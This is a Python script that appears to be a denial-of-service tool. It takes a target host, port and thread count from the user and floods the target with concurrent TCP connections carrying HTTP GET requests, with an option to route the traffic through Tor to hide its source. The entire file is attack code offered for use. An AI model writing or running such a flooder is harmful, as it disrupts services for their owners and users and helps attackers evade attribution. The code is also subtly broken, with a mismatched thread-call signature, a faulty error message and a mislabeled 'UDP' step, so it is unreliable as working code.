import concurrent.futures
import socket
import socks
import time
from datetime import datetime


class DoS:
    def __init__(self, host, port, nThreads, useTor):
        # Target Info
        self.host = host
        self.port = port
        # Num of Attacks
        self.nThreads = nThreads
        self.threads = []
        # Tor
        self.useTor = useTor
        self.TPS = 0
        self.Delimiter = 2000
        # Message
        self.message = "GET /" + self.host + " HTTP/1.1\r\n"

        if self.useTor:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)

    def Zombie(self):
        if self.useTor:
            s = socks.socksocket()
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            s.connect((self.host, self.port))
            s.send(self.message.encode("ascii"))  # TCP Attack
            s.sendto(self.message.encode("ascii"),
                     (self.host, self.port))  # UDP Attack
        except socket.error as err:
            print("[-] Error Message: " + err)
            pass
        except KeyboardInterrupt:
            print("[-] Canceled By User")
            exit("[-] Canceled By User")

        s.close()

    def Attack(self):
        with concurrent.futures.ThreadPoolExecutor() as executer:
            executer.map(self.Zombie, range(self.nThreads))


if __name__ == "__main__":
    print("\n==============================")
    print("       Ping Target")
    print("==============================")
    Tor = input('[?] Did you want to use Tor (Y/N): ').lower()
    host = input("[*] Enter Target Host Address: ")
    port = int(input("[*] Enter Target Port to Attack: "))
    threads = int(input("[*] Enter number of Attacks: "))

    hostip = socket.gethostbyname(host)
    useTor = True if Tor == 'y' else False

    DoS = DoS(host, port, threads, useTor)

    print("\n==============================")
    print("       Target Info")
    print("==============================")
    print("Host {} && IP {}".format(host, hostip))

    print("\n==============================")
    print("       Launching Attack")
    print("==============================")
    print("[#] Starting The Attack At {} ...".format(time.strftime("%H:%M:%S")))
    start_time = datetime.now()

    DoS.Attack()

    end_time = datetime.now()
    total_time = end_time - start_time

    print("[#] The Attack Was Done At {} ...".format(time.strftime("%H:%M:%S")))
    print("[#] Total Attack Time {}".format(total_time))
